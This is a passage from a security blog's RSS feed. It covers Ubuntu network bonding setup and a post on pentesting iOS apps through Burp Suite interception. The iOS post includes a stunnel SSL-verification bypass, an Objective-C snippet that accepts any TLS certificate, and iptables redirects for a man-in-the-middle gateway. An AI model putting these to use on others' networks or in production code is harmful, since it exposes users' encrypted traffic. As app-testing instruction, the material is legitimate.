&lt;pre&gt;&lt;code&gt;# apt-get install ifenslave
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;2.）加载bonding模块，使用mode 6&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# modprobe bonding mode=6 miimon=100 

\#（加载模块会加载/etc/network/interfaces配置）
\#（如出现cant‘t find bond0，卸载再重新加载：modprobe -r bonding &amp;amp;&amp;amp; modprobe bonding）

# lsmod | grep bonding

\# 设置开机自动加载
# echo &amp;quot;bonding mode=6 miimon=100&amp;quot; &amp;gt;&amp;gt; /etc/modules &amp;amp;&amp;amp; cat /etc/modules

\#（设置内核模块参数）
# modinfo -p bonding -- 列出模块支持的参数
# modprobe bonding mode=6 miimon=100

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;3.）配置网卡 /etc/network/interfaces&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# cd /root
# cp /etc/network/interfaces etc.network.interfaces
# vi etc.network.interfaces_bond
auto lo
iface lo inet loopback

auto bond0
iface bond0 inet static
address 192.168.190.129
netmask 255.255.255.0
gateway 192.168.190.250

auto bond0:1
iface bond0:1 inet static
address 192.168.2.220
netmask 255.255.255.0

dns-nameserver 114.114.114.114 233.5.5.5
pre-down ifenslave -d bond0 eth0 eth1
post-up ifenslave bond0 eth0 eth1

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;4.）SSH 远程重启网卡/网络&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;方法1：
# screen 
\# 注意命令必须在screen里执行，否则ifdown后面的命令无法执行。
# cp etc.network.interfaces /etc/network/interfaces &amp;amp;&amp;amp; ifdown eth0 &amp;amp;&amp;amp; cp etc.network.interfaces_bond /etc/network/interfaces &amp;amp;&amp;amp; ifup bond0 

\## 特别注意：执行以上命令前，必须先确认接口状态（ifconfig）根据状态使用不同的命令，也要注意管道&amp;amp;&amp;amp;，因为前面命令返回结果可能不为0，但是网卡已经down了。
举例：
接口当前是bond0，UP状态
# bash -c &amp;quot;ifdown bond0 &amp;amp;&amp;amp; modprobe -r bonding &amp;amp;&amp;amp; modprobe bonding&amp;quot;    --- 不成功
# bash -c &amp;quot;ifdown bond0 ;sleep 10  ; modprobe -r bonding &amp;amp;&amp;amp; modprobe bonding&amp;quot;    --- 成功（注意sleep和;的使用）

方法2：
# bash -c &amp;quot;ifdown eth0 &amp;amp;&amp;amp; ifup eth0&amp;quot;
\# 注意bash -c（The solution is to run the command in a new shell）

参考：
http://serverfault.com/questions/278838/restarting-network-through-ssh
http://askubuntu.com/questions/441619/how-to-successfully-restart-a-network-without-reboot-over-ssh

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;5.）修改Bond接口配置（和模块参数），强制重新加载&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;方法1.
# screen
# ifdown -a  ;modprobe -r bonding &amp;amp;&amp;amp; modprobe bonding &amp;amp;&amp;amp; sleep 5 &amp;amp;&amp;amp; ifup -a --force ; ifconfig
# ifdown -a  ;modprobe -r bonding &amp;amp;&amp;amp; modprobe bonding mode=6 &amp;amp;&amp;amp; sleep 5 &amp;amp;&amp;amp; ifup -a --force ; ifconfig  --- （模块参数）

方法2.
# bash -c &amp;quot;ifdown -a  ;modprobe -r bonding &amp;amp;&amp;amp; modprobe bonding &amp;amp;&amp;amp; sleep 5 &amp;amp;&amp;amp; ifup -a --force ; ifconfig&amp;quot;

\## 特别注意：Ubuntu Server重启网络/网卡必须通过 ifdown eth0 &amp;amp;&amp;amp; ifup eth0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;6.）查看Bonding状态&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;# cat /proc/net/bonding/bond0 

Ethernet Channel Bonding Driver: v3.7.1 (April 27, 2011)

Bonding Mode: adaptive load balancing
Primary Slave: None
Currently Active Slave: eth1
MII Status: up
MII Polling Interval (ms): 100
Up Delay (ms): 0
Down Delay (ms): 0

Slave Interface: eth0
MII Status: up
Speed: 1000 Mbps
Duplex: full
Link Failure Count: 0
Permanent HW addr: 6c:92:bf:42:05:72
Slave queue ID: 0

Slave Interface: eth1
MII Status: up
Speed: 1000 Mbps
Duplex: full
Link Failure Count: 0
Permanent HW addr: 6c:92:bf:42:05:73
Slave queue ID: 0

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;7.）其他配置方式&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Network bonding with mode 6

# vi /etc/network/interfaces

\# eth0 is manually configured, and slave to the &amp;quot;bond0&amp;quot; bonded NIC
auto eth0
iface eth0 inet manual
bond-master bond0


\# eth1 ditto, thus creating a 2-link bond.
auto eth1
iface eth1 inet manual
bond-master bond0

\# bond0 is the bonding NIC and can be used like any other normal NIC.
\# bond0 is configured using static network information.
auto bond0
iface bond0 inet static
address 192.168.190.129
gateway 192.168.190.1
netmask 255.255.255.0
bond-mode 6 
bond-miimon 100
bond-slaves eth0 eth1

dns-nameserver 114.114.114.114 233.5.5.5
pre-down ifenslave -d bond0 eth0 eth1
post-up ifenslave bond0 eth0 eth1

\# 启动接口（注意启动方式）
# ifup eth0 &amp;amp;&amp;amp; ifup eth1 &amp;amp;&amp;amp; ifup bond0 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;8.）关于Mode&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Mode 0
balance-rr

Mode 1
active-backup

Mode 2
balance-xor

Mode 3
broadcast

Mode 4
802.3ad

Mode 5
balance-tlb

Mode 6
balance-alb

1.The active-backup, balance-tlb and balance-alb modes do not require any specific configuration of the switch.

2.Other bonding modes require configuring the switch to aggregate the links. 
For example, a Cisco switch requires EtherChannel for Modes 0, 2, and 3, but for Mode 4 LACP and EtherChannel are required. 

参考：
https://www.kernel.org/doc/Documentation/networking/bonding.txt

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;9.）参考资料&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;https://help.ubuntu.com/community/UbuntuBonding
https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/Networking_Guide/ch-Configure_Network_Bonding.html
http://backdrift.org/lacp-configure-network-bonding-linux
https://www.cyberciti.biz/faq/ubuntu-setup-a-bonding-device-and-enslave-two-real-ethernet-devices/
https://www.cyberciti.biz/faq/ubuntu-linux-bridging-and-bonding-setup/
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>Pentesting iOS Applications Part 1 - Intercepting HTTP(S) Traffic with Burp Suite</title>
      <link>https://www.zer0d0y.info/post/Pentesting-iOS-Applications-Part-1/</link>
      <pubDate>Sun, 19 Feb 2017 14:50:02 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/Pentesting-iOS-Applications-Part-1/</guid>
      <description>

&lt;h4 id=&#34;tl-dr-深度探索ios-app流量分析方法&#34;&gt;&lt;strong&gt;TL;DR -&lt;/strong&gt; 深度探索iOS App流量分析方法&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;ENV（环境）：&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;OS：Deiban 8.x&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;iOS：10.x&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Broswer：Chrome 56.x/Safari 10&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Burp Suite Pro：v1.7.x&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;App：咕咚运动&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;

&lt;!--- **Intercepting HTTP(S) Traffic：**

&gt; - Burp 配置
&gt; - ①.PC和iOS设备连接到同一局域网
&gt; - ②.配置Burp监听0.0.0.0:8080，勾选Running复选框

&gt; - iOS设备配置：
&gt; - ③.设置 - Wi-Fi - &#34;SSID&#34; - 点击i - HTTP PROXY - Manual，填写运行Burp的PC的IP地址和端口
&gt; - ④.浏览器里打开http://burp -- 点击CA Certificate -- 安装证书
&gt; - ⑤.测试：浏览器里打开http://www.google.com，https://www.google.com
--&gt;

&lt;dl&gt;
&lt;dt&gt;Intercepting HTTP(S) Traffic：&lt;/dt&gt;
&lt;dd&gt;&lt;p&gt;Burp 配置：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;①.PC和iOS设备连接到同一局域网，启动Burp：cd /Path/to/burpsuite_pro &amp;amp;&amp;amp; java -jar -Xmx2G burpsuite_pro.jar&lt;/p&gt;

&lt;p&gt;②.配置Burp监听0.0.0.0:8080，勾选Running复选框&lt;/p&gt;
&lt;/blockquote&gt;&lt;/dd&gt;
&lt;dd&gt;&lt;p&gt;iOS设备配置：&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;③.设置 - Wi-Fi - &amp;ldquo;SSID&amp;rdquo; - 点击i - HTTP PROXY - Manual，填写运行Burp的PC的IP地址和端口&lt;/p&gt;

&lt;p&gt;④.浏览器里打开&lt;a href=&#34;http://burp&#34;&gt;http://burp&lt;/a&gt; &amp;mdash;&amp;gt; 点击CA Certificate &amp;mdash;&amp;gt; 安装证书（测试完成后删除证书）&lt;/p&gt;

&lt;p&gt;⑤.测试：浏览器(Safari)里分别打开&lt;a href=&#34;http://z.cn&#34;&gt;http://z.cn&lt;/a&gt; 和 &lt;a href=&#34;https://www.google.com&#34;&gt;https://www.google.com&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/dd&gt;
&lt;/dl&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;images/Pentesting-iOS-Applications/P1001.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;strong&gt;Bypassing SSL endpoint verification with stunnel：&lt;/strong&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;①.modifying a plist file containing the endpoint URL.&lt;/li&gt;

&lt;li&gt;&lt;p&gt;②.配置Stunnel使用Client模式，Stunnel配置文件示例如下：&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;; SSL client mode
client = yes
; service-level configuration   
[https]   
accept = 127.0.0.1:80   
connect = TargetIP:443   
TIMEOUTclose = 0   
&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;③.配置Burp使用&lt;a href=&#34;https://portswigger.net/burp/help/proxy_options_invisible.html&#34;&gt;invisible proxying&lt;/a&gt;并将请求重定向到Stunnel&lt;br /&gt;
Burp &amp;mdash;&amp;gt; Proxy &amp;mdash;&amp;gt; Options &amp;mdash;&amp;gt; Edit(0.0.0.0:8080) &amp;mdash;&amp;gt; Request Handling(IP:127.0.0.1 Port:80)，勾选Support invisible proxying&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;images/Pentesting-iOS-Applications/P1002.jpg&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;dl&gt;
&lt;dt&gt;&lt;strong&gt;iOS networking&lt;/strong&gt;&lt;/dt&gt;
&lt;dd&gt;&lt;p&gt;iOS network API:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;①.the URL loading system(NSURLConnection or NSURLSession)&lt;br /&gt;
②.the Foundation NSStream API&lt;br /&gt;
③.the Core Foundation CFStream API.&lt;br /&gt;
&lt;strong&gt;NSStream和CFStream(Lower-Level Networking)&lt;/strong&gt;用于处理非HTTP类型连接的数据，参考：&lt;a href=&#34;https://github.com/iSECPartners/tcpprox/&#34;&gt;https://github.com/iSECPartners/tcpprox/&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;&lt;/dd&gt;
&lt;/dl&gt;

&lt;p&gt;&lt;strong&gt;Spotting NSURLSession TLS Bypasses&lt;/strong&gt;&lt;br /&gt;
NSURLSession has a way to avoid TLS checks as well. Apps can just use the didReceiveChallenge delegate and pass the proposedCredential of the challenge received back as a credential for the session,&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;- (void)URLSession:(NSURLSession *)session didReceiveChallenge:(NS
   URLAuthenticationChallenge *)challenge completionHandler:(void (^)(NS
   URLSessionAuthChallengeDisposition disposition, NSURLCredential * credential))
   completionHandler {
   completionHandler(NSURLSessionAuthChallengeUseCredential,
    [challenge proposedCredential]);
}
&lt;/code&gt;&lt;/pre&gt;

&lt;h5 id=&#34;相关技术-中间人-攻击-和端口镜像-network-tap&#34;&gt;相关技术（中间人“攻击”和端口镜像/Network Tap）&lt;/h5&gt;

&lt;p&gt;A.中间人“攻击”，&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Linux 服务器（网关）配置：
1.echo 1 &amp;gt; /proc/sys/net/ipv4/ip_forward
2.iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
3.iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
4.Burp Suite 监听 *:8080，勾选Invisible

iOS设备配置：
网关设置为Linux 服务器IP地址
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;B.端口镜像/Network Tap，&lt;br /&gt;
参考：&lt;br /&gt;
&lt;a href=&#34;https://en.wikipedia.org/wiki/Port_mirroring&#34;&gt;端口镜像&lt;/a&gt;/&lt;a href=&#34;https://en.wikipedia.org/wiki/Network_tap&#34;&gt;Network Tap&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>2017 价值</title>
      <link>https://www.zer0d0y.info/post/keywords-of-this-year/</link>
      <pubDate>Wed, 01 Feb 2017 15:34:26 +0800</pubDate>
      
      <guid>https://www.zer0d0y.info/post/keywords-of-this-year/</guid>
      <description>&lt;p&gt;&lt;embed src=&#39;https://player.youku.com/player.php/sid/XMjQ4ODE2MjIxMg==/v.swf&#39; allowFullScreen=&#39;true&#39; quality=&#39;high&#39; width=&#39;480&#39; height=&#39;400&#39; align=&#39;middle&#39; allowScriptAccess=&#39;always&#39; type=&#39;application/x-shockwave-flash&#39;&gt;&lt;/embed&gt;&lt;/p&gt;
</description>
    </item>
    
  </channel>
</rss>